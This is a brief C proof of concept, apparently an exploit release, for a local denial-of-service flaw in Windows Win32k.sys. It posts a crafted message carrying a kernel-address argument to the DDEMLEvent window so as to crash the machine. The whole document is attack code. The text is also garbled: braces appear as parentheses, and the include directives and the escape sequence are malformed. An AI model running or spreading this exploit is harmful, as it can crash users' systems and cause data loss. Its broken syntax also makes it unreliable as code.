# Include "stdafx.h" 
# Include "windows.h" 
int main (int argc, char * argv []) 
( 
printf("Microsoft Windows Win32k.sys SfnINSTRING Local D.O.S Vuln\nBy MJ0011\nth_decoder$126.com\nPressEnter");

getchar();

HWND hwnd = FindWindow ("DDEMLEvent", NULL); 

if (hwnd == 0) 
( 
   printf ("cannot find DDEMLEvent Window! \ n"); 
   return 0; 
) 

PostMessage (hwnd, 0x18d, 0x0, 0x80000000); 


return 0; 
) 
